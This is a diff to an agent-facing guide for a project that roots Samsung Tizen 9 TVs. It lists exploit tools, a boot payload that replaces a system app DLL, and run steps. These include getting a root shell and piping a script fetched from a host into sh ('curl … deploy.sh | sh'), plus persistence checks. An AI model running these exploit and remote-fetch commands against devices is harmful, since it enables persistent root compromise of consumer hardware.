@@ -4,7 +4,10 @@ You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
 then `docs/EXPLOIT.md` (how it works), `docs/USAGE.md` (running it),
 `docs/ROOT-METHODS.md` (what was found), `docs/FAILED.md` (do not repeat these),
 `docs/SERVER-HOSTING.md` (the PC-side server) and `docs/REMOTE.md`
-(remote/hotkey remapping). History lives in `CHANGELOG.md`.
+(remote/hotkey remapping). History lives in `CHANGELOG.md`,
+and the current work list — triaged from an independent code review — is
+`docs/OPEN-ISSUES.md`: read it before changing anything, it says what is known
+broken, in what order to fix it, and how to prove each fix.
 
 ## 0. Maintaining this repo — read before editing
 
@@ -150,7 +153,8 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/physrpc.S` | ARM32 RPC stub source |
 | `tools/build_physrpc.py` | assembles the stub (keystone/capstone) |
 | `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`) |
-| `payload/Program.cs` | boot payload source (v7) |
+| `tools/sim_rpc.py` | in-memory physmap RPC (no TV); `python tools/sim_rpc.py` self-test |
+| `payload/Program.cs` | boot payload source (v13) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -221,7 +225,7 @@ shell - that corrupts the stream and wastes the page load.
 
 ### Repository hygiene (`.gitignore`, `.gitattributes`)
 
-**Committed** (36 files, ~380 KB on a fresh clone): `docs/`, `payload/*.cs` +
+**Committed** (47 files, ~400 KB on a fresh clone): `docs/`, `payload/*.cs` +
 `*.csproj`, `server/{server.py,index.html,payload.dll,deploy.sh,uninstall.sh,diag.sh}`,
 `server/lib/`, `server/payloads/`, `tools/*.py|*.S|*.txt`, `root.ps1`,
 `uninstall.ps1`, `AGENTS.md`, `README.md`, `NOTICE.md`.
@@ -277,7 +281,7 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=17920, MD5=d247e67a..., COPY=ok, DEPLOY_DONE
+#    expect: UID=0, SIZE=21504, MD5=17691434..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
 
@@ -292,7 +296,7 @@ python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'"
 
 - [ ] `root_shell.py "id"` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff"` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll"` → `d247e67a…`.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <tv-ip>` → `17691434…`.
 - [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
 - [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
 
